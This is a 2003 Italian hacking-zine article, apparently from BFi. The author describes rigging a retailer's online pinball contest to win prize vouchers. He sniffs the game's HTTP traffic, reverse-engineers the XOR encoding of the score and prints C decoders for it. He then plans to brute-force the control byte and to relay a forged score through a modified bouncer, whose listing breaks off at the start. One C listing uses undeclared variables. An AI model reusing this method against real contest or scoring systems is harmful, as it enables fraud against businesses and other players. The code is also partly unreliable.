@@ -1,0 +1,1440 @@
+==============================================================================
+-------------[ BFi numero 11, anno 6 - 23/12/2003 - file 3 di 15 ]------------
+==============================================================================
+
+
+-[ HACKiNG ]------------------------------------------------------------------
+---[ PER UN PUGN0 Di EUR0
+---[ dev-01, 04/01/2002
+-----[ Jack McKraK <mckrak@psynet.net>
+
+
+Freddo e gelo fuori dalla finestra, dei pinguini saltano felici sul cofano
+gelato della mia macchina... una cioccolata calda corretta col Baileys' mi
+aspetta vicino alla tastiera... gli Incubus in sottofondo scaldano la stanza.. 
+
+...secondo voi oggi ho voglia di uscire ?? Naaaa
+
+Queste sono le pericolosissime giornate di cazzeggio in cui, non si sa come,
+alla fine rischio sempre la galera. Lo so gia`... dovrei uscire di casa per
+evitare di combinare casini. Ma non posso... oggi devo rispondere a questa
+domanda:
+
+	Qualche riga di codice in C vale 2000 EURO ?
+
+In questo articolo vi spieghero` perche` alla GasJeans Italia sono convinti di
+si`.
+
+Partiamo dall'inizio.
+
+www.gasjeans.it
+
+Sito come tanti altri, non chiedetemi come ci sono arrivato... cercavo
+qualcosa sui protocolli di rete... giustamente con qualche link di link sono
+finito in un sito di abbigliamento.
+
+Nella home page appare subito il logo di un'iniziativa molto simpatica: IL
+PINEBALL! Trattasi di un gioco, precisamente un "simulatore" di flipper,
+programmato in Flash. E` interessante soprattutto perche` il punteggio che
+ottieni e` alla base di un torneo virtuale dove i primi tre classificati
+hanno diritto rispettivamente a
+
+	250, 400 e ben 2000 EURO in buoni di acquisto!
+
+Dopo aver scoperto che il flipper e` parecchio esoso in risorse di sistema e
+dopo aver perso ben 20 minuti per rimediare solo 20000 punti (per entrare in
+classifica ne servono almeno 170000)... una domanda si affacciava sul lobo
+frontale del mio cervello: 
+
+	sara` possibile taroccarlo??
+
+Ok, non ho intenzione di rubare 2000 Euro (precisiamo 2000 Euro da spendere in
+negozi della GAS Jeans)... voglio solo dimostrare che e` possibile!!
+
+Come spieghero` meglio in seguito questa azione e` solo dimostrativa e
+l'azienda e` stata subito avvertita del mio falso exploit nella classifica.
+Se stavo zitto vi assicuro che con un'alta probabilita` non si sarebbero
+accorti del mio lavoro e mi avrebbero dato il buono di 2000 Euro senza
+problemi. 
+
+Oddio... allora sono un hacker etico?
+
+No, no, no non voglio entrarci in quella categoria. Poi devi sempre darti un
+tono, devi dire che sei sempre bravo e gentile, devi aiutare gli altri... che
+palle!! Al massimo sono un hacker etilico... quello che finisce in un host e
+non si ricorda come c'e` entrato!! Cazzo e` molto piu` divertente e non passi
+il tempo a rompere i coglioni a tutti con la differenza fra etica, lamer,
+script bambini, i governativi, gli ex-hacker con problemi di emorroidi... 
+Harrgggg, mi e` andato in pappa il cervello a forza di sentire questi
+discorsi.
+
+Insomma passiamo alle cose serie...
+
+
+	FASE UNO: LA TATTICA.
+
+La cosa piu` importante in questi casi e`: da dove iniziare? Il mio obiettivo
+e` fare entrare il punteggio-fake nel database della gasjeans e avere diritto
+cosi` a 2000 Euro. La strategia piu` diretta sarebbe un hack del server. Entro,
+edito il database ed esco. Pero` ragioniamo con calma... mi conviene? Potrebbe
+non essere cosi` facile, da una prima analisi del loro network probabilmente
+sono coperti da firewall, pure il ping non passa. Dovrei entrare usando la
+porta 80, ma il webserver (Apache 1.3.20) sembra ben configurato e non conosco
+modi rapidi di fotterlo.
+
+La mia politica e` tutto e subito... non posso aspettare una vulnerabilita`
+per un attacco mirato.
+
+Potrei mandare qualche allegato-pacco via mail che mi apra una connessione
+dall'interno, ma ultimamente l'attenzione per gli allegati sospetti e` alta,
+non ci cascherebbero facilmente. Poi il server con il database dei punteggi
+potrebbe essere chissa` dove, non ho voglia di passare ore nella loro rete
+interna con il culo tirato... Potrebbero anche loggare gli scan e le query
+sospette... troppo invasivo... se si accorgono che sono sotto pressione
+possono insospettirsi e rendere vani i miei tentativi.
+
+Ok, deciso. L'attacco diretto al server e` da escludere.
+
+Cerchiamo di capire come funziona il gioco. E` un file flash eseguito in
+locale. MOLTO MOLTO INTERESSANTE. Questo apre due strade. La prima e` cercare
+di crakkare il gioco con un debugger della memoria del picci e fargli credere
+che il mio punteggio sia stratosferico. Lui a quel punto lo trasferisce al
+server e mi mette in classifica!! Potrebbe funzionare... ma non sono un buon
+cracker, ci metterei del tempo a trovare il punto giusto in memoria, e devo
+prima sapere cosa si dice il programma in flash con il server remoto durante
+la partita.
+
+tcpdump -i ippp0 -X -s 2000
+
+il classico tcpdump fa tutto quello che ci serve, lancio questo comando prima
+di iniziare a giocare e stiamo a vedere.
+
+Analisi del traffico:
+
+La connessione fra il server e il client resta sempre sulla porta 80 e sempre
+allo stesso IP (195.223.184.30)
+
+Non sembra vengano scambiati dati fondamentali durante la partita, solo
+pacchetti di controllo per verificare che il client sia raggiungibile.
+
+NON SEMBRA CRIPTATO. Niente supporto SSL... MOLTO MOLTO BENE!! Qui c'e` da
+lavorare.
+
+Da queste informazioni si puo` dedurre subito che il programma flash gestisce
+tutta la partita e solo alla fine trasmette al server il risultato finale.
+Come fra l'altro si poteva intuire dal bottone di "SAVE RESULT" che appare
+quando visualizza il punteggio. Se davvero non e` criptato siamo a cavallo.
+
+Questa e` sicuramente la strada piu` veloce per cercare di ottenere il
+risultato. Intercettare il traffico fra il client e il server, maggiorare il
+punteggio e rispedire. Lasciamo stare dunque complicati debugger e analisi
+della memoria, la strada piu` semplice e` spesso quella giusta.
+
+
+	FASE DUE: INSERIAMO IL PUNTEGGIO-FAKE
+
+Ora bisogna capire come e dove passa il punteggio nei pakketti tcp diretti
+all'80. Il traffico non e` molto, se il risultato e` scritto in chiaro questo
+e` il metodo migliore. Controllo tutto il traffico e ovviamente cerco la
+stringa del punteggio (in ASCII e HEX) nel dump di quello che esce dal mio
+adattatore ISDN.
+
+tcpdump -i ippp0 -X -s 2000 > gas
+
+cerco la stringa del punteggio in "gas" e...
+
+...niente... cazzo... niente? Guardiamo il traffico in dettaglio e cerchiamo 
+il pacchetto che passa nell'istante esatto in cui viente salvato il risultato.
+
+Eccolo:
+
+> 195.223.184.30.www: P 0:635(635) ack 1 win 64974 (DF)
+0x0000	 4500 02a3 048e 4000 7f06 46f2 971a 9abc	E.....@...F.....
+0x0010	 c3df b81e 0422 0050 4160 e647 0d89 91f3	.....".PA`.G....
+0x0020	 5018 fdce 9af5 0000 4745 5420 2f69 742f	P.......GET./it/
+0x0030	 6a68 746d 6c2f 636f 6d6d 756e 6974 792f	jhtml/community/
+0x0040	 6761 6d65 732f 656e 645f 6761 6d65 3330	games/end_game30
+0x0050	 3030 3035 2e6a 6874 6d6c 3f63 7263 3d31	0005.jhtml?crc=1
+0x0060	 3834 3038 3130 3034 3139 3031 3439 3037	8408100419014907
+0x0070	 3930 3730 3031 3731 3834 3031 3530 3033	9070017184015003
+0x0080	 3232 3731 3331 3030 3830 3233 3031 3732	2271310080230172
+0x0090	 3430 3038 3330 3930 3234 3131 3538 3033	4008309024115803
+0x00a0	 3131 3137 3036 3531 3639 3031 3330 3135	1117065169013015
+0x00b0	 3137 3631 3936 3037 3530 3236 3032 3232	1761960750260222
+0x00c0	 3438 3038 3530 3232 3235 3531 3436 3032	4808502225514602
+0x00d0	 3430 3639 3038 3431 3732 3039 3330 3933	4069084172093093
+0x00e0	 3138 3131 3936 3037 3530 3836 3036 3831	1811960750860681
+0x00f0	 3639 3030 3330 3031 3233 3331 3532 3032	6900300123315202
+0x0100	 3030 3838 3032 3732 3430 3038 3830 3934	0088027240088094
+0x0110	 3139 3031 3339 3031 3130 3639 3038 3431	1901390110690841
+0x0120	 3838 3039 3330 3832 3138 3131 3938 3037	8809308218119807
+0x0130	 3930 3836 3038 3531 3731 3031 3530 3234	9086085171015024
+0x0140	 3233 3232 3032 3037 3630 3138 3032 3132	2322020760180212
+0x0150	 3438 3032 3830 3034 3233 3631 3534 3033	4802800423615403
+0x0160	 3030 3233 3130 3831 3639 3030 3330 3333	0023108169003033
+0x0170	 3139 3231 3438 3034 3830 3838 3037 3131	1921480480880711
+0x0180	 3633 3231 3520 4854 5450 2f31 2e31 0d0a	63215.HTTP/1.1..
+0x0190	 4163 6365 7074 3a20 696d 6167 652f 6769	Accept:.image/gi
+0x01a0	 662c 2069 6d61 6765 2f78 2d78 6269 746d	f,.image/x-xbitm
+0x01b0	 6170 2c20 696d 6167 652f 6a70 6567 2c20	ap,.image/jpeg,.
+0x01c0	 696d 6167 652f 706a 7065 672c 202a 2f2a	image/pjpeg,.*/*
+0x01d0	 0d0a 4163 6365 7074 2d4c 616e 6775 6167	..Accept-Languag
+0x01e0	 653a 2069 740d 0a41 6363 6570 742d 456e	e:.it..Accept-En
+0x01f0	 636f 6469 6e67 3a20 677a 6970 2c20 6465	coding:.gzip,.de
+0x0200	 666c 6174 650d 0a55 7365 722d 4167 656e	flate..User-Agen
+0x0210	 743a 204d 6f7a 696c 6c61 2f34 2e30 2028	t:.Mozilla/4.0.(
+0x0220	 636f 6d70 6174 6962 6c65 3b20 4d53 4945	compatible;.MSIE 
+0x0230	 2036 2e30 3b20 5769 6e64 6f77 7320 4e54	.6.0;.Windows.NT
+0x0240	 2035 2e31 290d 0a48 6f73 743a 2031 3935	.5.1)..Host:.192
+0x0250	 2e32 3233 2e31 3834 2e33 300d 0a43 6f6e	.168.100.30..Con
+0x0260	 6e65 6374 696f 6e3a 204b 6565 702d 416c	nection:.Keep-Al
+0x0270	 6976 650d 0a43 6f6f 6b69 653a 204a 5345	ive..Cookie:.JSE
+0x0280	 5353 494f 4e49 443d 4456 4759 534e 524a	SSIONID=DVGYSNRJ
+0x0290	 5558 5433 5a51 3435 5841 5043 4645 510d	UXT3ZQ45XAPCFEQ.
+0x02a0	 0a0d 0a
+
+Normale query HTML... bene, bene...
+
+no, no, no... bene un cazzo...
+
+crc=1814... e` criptato con un algoritmo!! Noooo
+tutti i miei sogni di gloria, tutte le mie speranze in fumo!! Non posso
+inserire il mio risultato se non so come questo viene criptato...
+
+Dunque tutto finito?
+
+Be` ora il gioco si fa duro... ma io non mi arrendo.
+
+Ti conosco programmatore di questo gioco.
+Lo so che non vedevi l'ora di uscire da quell'ufficio, lo so che ti aspettava
+a casa la tua bella ragazza per trombare, lo so che non hai nemmeno
+ottimizzato il codice per fare andare questo gioco sul mio Pentium Celeron...
+lo so che l'algoritmo che hai usato non puo` essere complicato o commerciale,
+perche` in flash non hai tutte le comodissime librerie c... e soprattutto lo
+so che non hai perso troppo tempo perche` pensi: "chi vuoi che si metta a
+decifrarlo?!"
+
+Procediamo. Teoria del decrittatore:
+
+1) conosco il punteggio che passa.
+2) posso fare infinite prove con diversi punteggi e rispettive stringhe.
+
+non e` poco, se intuisco dov'e` posizionato il risultato all'interno della
+stringa posso provare ad inserire un numero casuale, magari ottengo un
+punteggio spropositato.
+
+Ecco delle stringhe con il rispettivo score.
+
+1604  - 12423417124701920316414812418017217000514024514605823524118402415515\
+	11961091821602490662072481470602381851820201561672091042302442420652\
+	03180193109184174160030144186158052227241247013143167209120230253252\
+	06420318020811118018316107620625414705616717116502815424523810916917\
+	2165011182
+
+10104 - 16412723213300317322013716403323921602123414114322812718213002924021\
+	22251790472352110921701281422281261792020192522112091660421871350811\
+	68128138168044231213010253223209166115190142085170204206187060242139\
+	08916112913816806122921701925214114322812718213002924720921117711520\
+	3215019240209196021
+
+10360 - 19719312020220608608513719715912715121601700414313319503220120801109\
+	32252101451231561450810091421331920351332220070902091991480432001560\
+	81015142201146119154199006086209199205046193152081069206218130098196\
+	14809000813820113111715022200700414313319503220120801208821120820509\
+	1152222011088196021
+
+Noto subito una cosa. Due lunghe uguali e una no! Perche`? Perche` due uguali
+e una no. Non puo` essere un caso. Cazzo il punteggio! Il primo ha 4 cifre...
+il secondo e il terzo ne hanno 5! Secondo me c'e` un'unica spiegazione:
+l'algoritmo lavora lettera per lettera cambiandola in qualche modo. Se
+scopro come si trasformano i vari caratteri l'ho fottuto. Ci sono 9 cifre in
+piu`... tenendo ferma l'ipotesi di questa trasformazione carattere per
+carattere ho due possibilita`:
+
+1) 1 carattere diventa lungo 9 cifre.
+2) 3 caratteri diventano lunghi 9 cifre insieme, quindi 1 carattere diventa
+   lungo 3.
+
+Verifichiamo. La stringa piu` lunga misura 303 numeri... divisibile per 3 e
+non per 9! Questo vuol dire che non puo` essere la prima ipotesi. Proviamo a
+dividerla in blocchi di 3:
+
+	->	124		164		197
+		234		127		193
+		171		232		120
+		247		133		202
+		 19		  3		206
+		203		173		 86
+		164		220		 85
+		148		137		137
+		
+	->	124		164		197
+		180		 33		159
+		172		239		127
+		170		216		151
+		  5		 21		216
+		140		234		 17
+		245		141		  4
+		146	->	143		143
+
+		 58		228		133
+		235		127		195
+		241		182		 32
+		184		130		201
+		 24		 29		208
+		155		240		 11
+		151		212		 93
+		196		225		225
+
+		109		179		210
+		182		 47		145
+		160		235		123
+		249		211		156
+		 66		 92		145
+		207		170		 81
+		248		128		  9
+		147		142		142
+
+		 60		228		133
+		238		126		192
+		185		179		 35
+		182		202		133
+		 20		 19		222
+		156		252		  7
+		167		211		 90
+		209		209		209
+
+		104		166		199
+		230		 42		148
+		244		187		 43
+		242		135		200
+		 65		 81		156
+		203		168		 81
+		180		128		 15
+		193		138		142
+
+		109		168		201
+		184		 44		146
+		174		231		119
+		160		213		154
+		 30		 10		199
+		144		253		  6
+		186		223		 86
+		158		209		209
+
+		 52		166		199
+		227		115		205
+		241		190		 46
+		247		142		193
+		 13		 85		152
+		143		170		 81
+		167		204		 69
+		209		206		206
+
+		120		187		218
+		230		 60		130
+		253		242		 98
+		252		139		196
+		 64		 89		148
+		203		161		 90
+		180		129		  8
+		208		138		138
+
+		111		168		201
+		180		 61		131
+		183		229		117
+		161		217		150
+		 76		 19		222
+		206		252		  7
+		254		141		  4
+		147	->	143		143
+
+		 56		228		133
+		167		127		195
+		171		182		 32
+		165		130		201
+		 28		 29		208
+		154		247		 12
+		245		209		 88
+		238		211		211
+
+		109		177		208
+		169		115		205
+		172		203		 91
+		165		215		152
+		 11		 19		222
+		182		240		 11
+
+Prima cosa: tutti i valori sono sotto a 255!! Siamo sulla strada giusta!!
+
+Vuol dire che i tre numeri rappresentano un byte. Ora bisogna capire come, ad
+esempio, 10360 e` salvato in questi byte. Potrebbe essere che sia in
+esadecimale 
+
+	10360 -> 0x2878 -> 40 120
+
+ma nella colonna 3 non c'e` ne` 40 ne` 120... azz... potrebbe essere che ogni
+numero corrisponda ad un carattere, magari ASCII... no, troppi codici di
+controllo e i caratteri sembrano casuali...
+
+Mmmmm, sara` piu` faticoso del previsto.
+
+C'e` pero` una cosa da notare... guardate le due colonne. Sembrano diverse, ma
+come vedete alcune ripetizioni nella prima sono uguali alle ripetizioni nella
+seconda. Perche`? Forse c'e` uno schema generale di codifica, forse
+corrispondono allo stesso carattere.
+
+Anzi... probabilmente e` cosi`.
+
+Dunque 124 - 164 - 197 hanno qualcosa in comune. Ma cosa? 
+
+Non sembra niente di diretto, le ripetizioni sono troppo poche... eppure sono
+sicuro che sotto ci deve essere la stessa stringa! Allora perche`
+124 - 164 - 197... perche` li ritroviamo poi nella riga 9 ?
+
+Tentativi: consideriamo che chiunque programmi un algoritmo per cifrare "alla
+buona" usa uno schema di solito simmetrico... ovvero la routine che cripta e`
+anche quella che decripta, cosi` ti risparmi di scrivere due routines
+completamente diverse. Questo favorisce una ben nota operazione: lo XOR. 
+
+A XOR B = C e C XOR B = A
+
+il testo in chiaro A viene criptato con B e diventa C, viceversa da C
+otteniamo A. Lo XOR qui in mezzo centra... ne sento la puzza!
+
+Poi una botta di culo... nella seconda e terza colonna noto che la serie di
+caratteri
+
+				143		143
+
+		 		228		133
+				127		195
+				182		 32
+				130		201
+		 		 29		208	
+
+si ripete due volte... azzo azzo azzo! allora non e` cosi` casuale. Ma la cosa
+ancora piu` strana e` che 143 in alto e 143 in basso sono esattamente distanti
+un multiplo di 8. Strano... anche perche` la stessa cosa succede nelle altre
+colonne.
+
+Allora l'ideona... 124 XOR 124 fa 0, perche` ovviamente lo xor di un numero
+per se stesso fa sempre 0. Zero e` sempre il principio di qualcosa. Pero` prima
+ci sono 8 righe... 8 righe e tutto va in multiplo di 8... quelle prime 8 righe
+in qualche modo sono la chiave.
+
+Mi serve un programmino per testare questa idea strana... le prime 8 righe
+sono il codice per decriptare le altre. Un semplice programmino in c e` quello
+che mi serve:
+
+<-| gas/xor.c |->
+
+#include <stdio.h>
+
+main () {
+
+	FILE *f1,*f2,*f3,*f4;
+	
+	int i;
+	
+	unsigned int c1,c2,c3;
+	unsigned int l1[10],l2[10],l3[10];
+	unsigned char c1x,c2x,c3x,c4x,c5x;
+	unsigned char c1f,c2f,c3f,c4f,c5f;
+	
+	f1 = fopen("p1.txt","r");
+	f2 = fopen("p2.txt","r");
+	f3 = fopen("p3.txt","r");
+	f4 = fopen("result","w");
+	
+	for(i=0;i<8;i++) {
+	
+		fscanf(f1,"%d\n",&l1[i]);
+		fscanf(f2,"%d\n",&l2[i]);
+		fscanf(f3,"%d\n",&l3[i]);
+		
+	}
+	
+	i = 0;
+	
+	while(!feof(f1)) {
+	
+		fscanf(f1,"%d\n",&c1);
+		fscanf(f2,"%d\n",&c2);
+		fscanf(f3,"%d\n",&c3);
+		
+		c1i = (unsigned char)l1[i%8];
+		c2i = (unsigned char)l2[i%8];
+		c3i = (unsigned char)l3[i%8];
+
+		c1x = (unsigned char)(c1 ^ c1i);
+		c2x = (unsigned char)(c2 ^ c2i);
+		c3x = (unsigned char)(c3 ^ c3i);
+				
+		fprintf(f4,"\t\t%2X\t\t%2X\t\t%2X\n",c1x,c2x,c3x);
+				
+		i++;
+		
+		if (i%8 == 0) fprintf(f4,"\n");
+		
+	}
+	
+	fclose(f1);
+	fclose(f2);
+	fclose(f3);
+	fclose(f4);
+	
+}
+<-X->
+
+Con immenso stupore mi appare questo:
+
+		 0		 0		 0
+		5E		5E		5E
+		 7		 7		 7
+		5D		5D		5D
+		16		16		16
+		47		47		47
+		51		51		51
+		 6		 6		 6
+
+		46		40		40
+		 1		 0		 2
+		5A		5E		58
+		4F		 7		 3
+		 B		1E		1E
+		50		5D		5D
+		33		 8		 8
+		50		68		68
+
+		11		17		17
+		5C		50		50
+		 B		 3		 3
+		 E		56		56
+		51		5F		5F
+		 4		 7		 7
+		5C		5C		5C
+		 7		 7		 7
+
+		40		40		40
+		 4		 1		 1
+		12		5B		5B
+		41		4F		4F
+		 7		10		10
+		57		51		51
+		 3		 F		 F
+		45		58		58
+
+		14		 2		 2
+		 C		55		55
+		5F		53		53
+		 5		 2		 2
+		52		52		52
+		 0		 5		 7
+		10		5C		5A
+		55		 3		 7
+
+		11		 C		 C
+		52		53		53
+		 5		 F		 F
+		57		50		50
+		 D		 9		 9
+		5B		50		50
+		1E		 3		 3
+		 A		58		58
+
+		48		 2		 2
+		 9		 C		 C
+		5A		56		56
+		 0		 B		 B
+		1E		56		56
+		44		 7		 7
+		 3		10		10
+		45		47		47
+
+		 4		1F		1F
+		 C		43		43
+		56		1A		1A
+		 B		 E		 E
+		53		5A		5A
+		 0		 C		 C
+		10		5D		5D
+		44		 3		 3
+
+		13		 C		 C
+		5E		42		42
+		1C		 D		 D
+		56		5C		5C
+		5F		10		10
+		 5		51		51
+		5A		51		51
+		 7		 6		 6
+
+		44		40		40
+		4D		 0		 2
+		 0		5E		58
+		52		 7		 3
+		 F		1E		1E
+		51		5A		5A
+		51		 D		 D
+		7A		5A		5A
+
+		11		15		15
+		43		 C		 C
+		 7		23		23
+		52		52		52
+		18		10		10
+		7D		5D		5D
+
+Ci siamo, la maggior parte delle cifre (seconda e terza colonna) sono
+costanti!!! La mia teoria era esatta, la codifica avviene carattere per
+carattere e le prime otto righe servono da codice. Ora il problema e`
+capire cosa sono questi numeri...
+
+Ancora nessun carattere ASCII... mmmm, forse ho cantato vittoria troppo
+presto.
+
+Ok, vi risparmio ora tutto il procedimento che ho seguito. Mi ha preso
+un'intera giornata e sono stato pure aiutato da mio fratello (matematico alla
+Normale di Pisa). La sintesi e` che da qualche parte il punteggio doveva
+essere scritto e che probabilmente stava in
+
+		 6 (1)		 6 (1)		 6 (1)
+		46 (6)		40 (0)		40 (0)
+		 1 (0)		 0 (1)		 2 (3)
+		5A (4)		5E (0)		58 (6)
+				 7 (4)		 3 (0)		
+
+perche' sono le 5 righe che cambiano e guarda caso 5 sono le cifre del
+punteggio. Il problema e` che ad esempio il carattere "0" in una riga e "0" in
+un'altra e` codificato in modo diverso. Una giornata per capire come
+funzionasse questa cosa, ma alla fine sono riuscito a cavarci qualcosa.
+
+Si trattava di usare una combinazione di XOR con una matrice di questo tipo:
+
+		{0x40,0x61,0x3e,0x63,0x52,0x04,0x5c,0x07,\
+		 0x40,0x01,0x5e,0x03,0x52,0x64,0x3c,0x67,\
+		 0x20,0x61,0x3e,0x63,0x52,0x04,0x5c,0x07,\
+		 0x40,0x01,0x5e,0x03,0x52,0x64,0x3c,0x67,\
+		 0x40,0x61,0x5e,0x03,0x52,0x04,0x5c,0x07,\
+		 0x40,0x61,0x3e,0x63,0x32,0x64,0x3c,0x67,\
+		 0x40,0x01,0x5e,0x03,0x52,0x04,0x5c,0x07,\
+		 0x20,0x01,0x5e,0x03,0x52,0x04,0x5c,0x07,\
+		 0x40,0x01,0x3e,0x63,0x52,0x64,0x5c,0x07,\
+		 0x40,0x01,0x5e,0x03,0x52,0x64,0x3c,0x67,\
+		 0x20,0x01,0x3e,0x63,0x32,0x04,0x3c,0x67,\
+		 0x20,0x61,0x5e,0x03,0x63,0x0,0x0,0x0};
+
+trovata a forza di tentativi confrontando i diversi caratteri. Per cui la
+codifica avviene in questo modo:
+
+	CARATTERE ASCII --->
+		SOTTRAGGO 0x30--->
+			XOR CON ELEMENTO OPPORTUNO DELLA MATRICE--->
+				XOR CON CODICE NELLE PRIME
+					OTTO RIGHE
+					--->RISULTATO
+
+Il procedimento e` simmetrico. Ecco il codice per decriptare:
+
+<-| gas/xor2.c |->
+#include <stdio.h>
+
+main () {
+
+	FILE *f1,*f5;
+	
+	int i;
+	unsigned char crc;
+	
+	unsigned int c1,c2;
+	unsigned int l1[10];
+	unsigned char c1x,c2x;
+	unsigned char c1f,c2f;
+	
+	unsigned char line[200] = \
+		{0x40,0x61,0x3e,0x63,0x52,0x04,0x5c,0x07,\
+		 0x40,0x01,0x5e,0x03,0x52,0x64,0x3c,0x67,\
+		 0x20,0x61,0x3e,0x63,0x52,0x04,0x5c,0x07,\
+		 0x40,0x01,0x5e,0x03,0x52,0x64,0x3c,0x67,\
+		 0x40,0x61,0x5e,0x03,0x52,0x04,0x5c,0x07,\
+		 0x40,0x61,0x3e,0x63,0x32,0x64,0x3c,0x67,\
+		 0x40,0x01,0x5e,0x03,0x52,0x04,0x5c,0x07,\
+		 0x20,0x01,0x5e,0x03,0x52,0x04,0x5c,0x07,\
+		 0x40,0x01,0x3e,0x63,0x52,0x64,0x5c,0x07,\
+		 0x40,0x01,0x5e,0x03,0x52,0x64,0x3c,0x67,\
+		 0x20,0x01,0x3e,0x63,0x32,0x04,0x3c,0x67,\
+		 0x20,0x61,0x5e,0x03,0x63,0x0,0x0,0x0};	
+	
+	f1 = fopen("p1.txt","r");
+	f5 = fopen("result","w");
+	
+	crc = 0;
+
+	for(i=0;i<8;i++) {
+	
+		fscanf(f1,"%d\n",&l1[i]);
+		
+		crc ^= l1[i];
+				
+	}
+	
+	i = 0;
+	
+	while(!feof(f1)) {
+	
+		fscanf(f1,"%d\n",&c1);
+		printf("%d ",c1);
+						
+		c1x = (unsigned char)(c1 ^ l1[i%8]);
+						
+		c1f = (c1x ^ line[i]) + 0x30;
+						
+		crc ^= c1;
+
+		fprintf(f5,"%2X %c %2X\n",c1x,c1f,c1f);
+				
+		i++;
+		
+		if (i%8 == 0) fprintf(f5,"\n");
+		
+	}
+
+	crc ^= c1;
+	
+	fclose(f1);
+	fclose(f5);
+	
+}
+<-X->
+
+Ora posso svelare cosa conteneva una delle tante stringhe che ho raccolto:
+
+	 0 p 70
+	5E o 6F
+	 7 i 69
+	5D n 6E
+	16 t 74
+	47 s 73
+	51 = 3D
+	 5 2 32
+
+	47 7 37
+	 8 9 39
+	5D 3 33
+	 B 8 38
+	1E | 7C
+	5D i 69
+	 8 d 64
+	68 ? 3F
+
+	17 g 67
+	50 a 61
+	 3 m 6D
+	56 e 65
+	5F = 3D
+	 7 3 33
+	5C 0 30
+	 7 0 30
+
+	40 0 30
+	 1 0 30
+	5B 5 35
+	4F | 7C
+	10 r 72
+	51 e 65
+	 F c 63
+	58 o 6F
+
+	 2 r 72
+	55 d 64
+	53 = 3D
+	 1 2 32
+	55 7 37
+	 D 9 39
+	5F 3 33
+	 F 8 38
+
+	 C | 7C
+	53 b 62
+	 F a 61
+	50 c 63
+	 9 k 6B
+	50 d 64
+	 3 o 6F
+	58 o 6F
+	
+	 2 r 72
+	 C = 3D
+	56 8 38
+	 B 8 38
+	56 4 34
+	 7 3 33
+	10 | 7C
+	47 p 70
+
+	1F o 6F
+	43 r 72
+	1A t 74
+	 E = 3D
+	5A 8 38
+	 C 8 38
+	5D 1 31
+	 3 4 34
+
+	 C | 7C
+	42 s 73
+	 D c 63
+	5C o 6F
+	10 r 72
+	51 e 65
+	51 = 3D
+	 5 2 32
+
+	47 7 37
+	 8 9 39
+	5D 3 33
+	 B 8 38
+	1E | 7C
+	5A n 6E
+	 D a 61
+	5A m 6D
+
+	15 e 65
+	 C = 3D
+	29 G 47
+	5F l 6C
+	 D o 6F
+	46 r 72
+	 5 i 69
+	5B l 6C
+
+	1C l 6C
+	50 a 61
+	14 z 7A
+	FF , 2C <- Byte di controllo
+
+Come vedete nella seconda colonna c'e` il testo in chiaro... perfetto!!!
+
+Ma attenzione... una bella sorpresa ci attende: BACKDOOR=8843 PORT=8814
+
+BACKDOOR???????????? COSA CAZZO CI FA LA SCRITTA BACKDOOR IN UNA STRINGA
+CRIPTATA SPEDITA DIRETTAMENTE DAL MIO PC???????
+
+Qui c'e` puzza di marcio, ma marcio d'annata. Quello che puoi sentire solo
+sotto le ascelle di Infected. Ok, potrebbe essere un normalissimo parametro
+del gioco.
+Come no... uno chiama backdoor una normalissima variabile di sistema. Mmmmmm,
+vi dico le mie teorie:
+
+O si tratta di un modo con cui il nostro programmatore puo` fare quel cazzo
+che vuole con i punteggi, cosi` che la sorella abbia ben 2000 euro da spendere
+in regali. Oppure, ipotesi peggiore, la backdoor la apre sul mio computer per
+il puro gusto di andare a curiosare... oppure e' una modo per entrare nei
+server della gasjeans e fregargli l'idea dei pantaloni metallizzati... oppure
+e` la gasjeans che vuole sapere i nostri gusti di abbigliamento!
+
+Insomma... niente che possa considerare buono o auspicabile!
+
+Se qualcuno vuole provare il gioco, invito tutti a controllare le proprie
+porte e i pacchetti in uscita. Io non ho rilevato anomalie, ma non mi gira
+bene che un programma che lavora sul MIO picci` spari in giro pakketti
+criptati con dentro la scritta "BACKDOOR".
+
+Ulteriori approfondimenti sono necessari... ora pero` voglio portare a
+termine la mia missione. Prima di passare alla fase 3 bisogna tenere conto di
+altri 2 importanti fattori:
+
+1) La matrice di xor cambia
+2) C'e` un byte di controllo 
+
+Questo byte causa non pochi problemi perche` non ho capito come viene
+calcolato. Ma fra poco vi spieghero` come fotterlo... un suggerimento
+1 byte -> 256 possibilita`... direi che ci scappa un bel bruteforce! Perdiamo
+pero` un po` nello stile del nostro attacco e rischiamo sicuramente di piu`
+di essere beccati. Ma chi non risika...
+
+Rimane il problema della matrice, ma c'e` la gabola anche qui:
+
+Se io gioco e finita la partita il programma rimane in cache... il codice
+della matrice sembra non cambiare nella partita dopo!! Questo significa che
+ho tutto il tempo di crearmi il mio pakketto ad hoc con dentro un punteggio
+da paura e rispedirlo al nostro server... 
+
+Ok, siamo dunque pronti per la
+
+
+	FASE TRE: READY TO GO
+
+Come fare a mandare il pacchetto modificato senza che il server se ne accorga?
+
+Beh ci sono vari modi per bloccare un pakketto e nello stesso tempo spedirne
+un altro, ma non e` facile. C'e` il problema del tempismo, c'e` il problema
+dei numeri di sequenza e del codice dei cookies che vengono passati dal
+browser per il login utente.
+
+Bloccare un pakketto e farne uno fake non e` la soluzione migliore.
+
+Il metodo giusto e` farlo rimbalzare! Vi spiego perche`...
+
+Prendiamo un normalissimo bouncer. Questo riceve un pacchetto e lo rimanda
+pari pari a un altro host. Ok, niente di nuovo. Ma se non lo rimanda pari
+pari? possiamo modificare il codice di un bouncer per fargli sostituire una
+stringa con un'altra. Puo` essere fattibile perche`
+
+1) La nostra connessione al server e` sempre allo stesso IP e sempre alla
+   stessa porta
+2) I pacchetti sono piccoli e non vengono frammentati, non c'e` problema di
+   recuperare pezzi della stessa stringa da pakketti diversi.
+
+Direi che e` la strada migliore, poche righe di codice e ottengo quello che
+voglio...
+
+Ora, dove trovare un bouncer? Beh il sito di S0ftPj secondo voi cosa ci sta a
+fare? e FuSyS per cosa l'hanno inventato?
+
+Ecco il codice del suo bouncer che potete trovare nell'elenco dei tool:
+
+<-| gas/bouncer.c |->
+/*
+ * Datapipe - Create a listen socket to pipe connections to another
+ * machine/port. 'localport' accepts connections on the machine running
+ * datapipe, which will connect to 'remoteport' on 'remotehost'. Fairly
+ * standard 500 xxxx extended errors are used if something drastic
+ * happens.
+ *
+ * (c) 1995 Todd Vierling
+ * fakeps no(c) 1998 fusys
+ * 
+ * Define STRERROR while compiling on a SunOS 4.x box
+ */
+
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <sys/wait.h>
+#include <netinet/in.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <errno.h>
+#include <unistd.h>
+#include <netdb.h>
+#include <time.h>
+
+#ifdef STRERROR
+extern char *sys_errlist[];
+extern int sys_nerr;
+char *undef = "Undefined error";
+
